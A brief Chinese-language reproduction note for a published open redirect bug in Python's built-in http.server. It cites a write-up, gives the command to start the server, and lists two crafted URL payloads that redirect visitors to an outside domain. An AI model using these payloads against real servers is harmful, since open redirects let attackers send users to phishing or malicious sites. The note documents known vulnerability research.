参考
	- https://www.leavesongs.com/PENETRATION/python-http-server-open-redirect-vulnerability.html

到19-5-21依旧没有更新

启动一个容器
```linux
python3 -m http.server
```

pyaload
```http
http://127.0.0.1:8000//example.com/%2f%2e%2e
http://127.0.0.1:8080////static%2fcss%2f@www.example.com/..%2f
```